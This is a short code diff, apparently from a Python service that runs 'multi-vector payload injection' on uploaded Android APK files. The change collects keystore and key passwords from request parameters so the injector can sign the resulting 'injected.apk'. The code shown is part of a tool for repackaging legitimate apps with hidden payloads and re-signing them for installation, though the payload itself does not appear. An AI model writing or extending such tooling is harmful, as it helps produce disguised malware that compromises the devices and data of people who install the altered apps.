@@ -796,7 +796,12 @@ async def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
             log.write("Step 4: Applying multi-vector payload injection...\n")
         
         temp_apk = workspace / "temp" / "injected.apk"
-        injection_success = injector.inject_payload(original_apk, temp_apk, injection_strategy)
+        # Prepare signing config from params (keystore optional)
+        sign_cfg = {}
+        for k in ("keystore_path", "key_alias", "keystore_password", "key_password"):
+            if params.get(k):
+                sign_cfg[k] = params.get(k)
+        injection_success = injector.inject_payload(original_apk, temp_apk, injection_strategy, sign_cfg)
         
         if not injection_success:
             raise Exception("Payload injection failed")
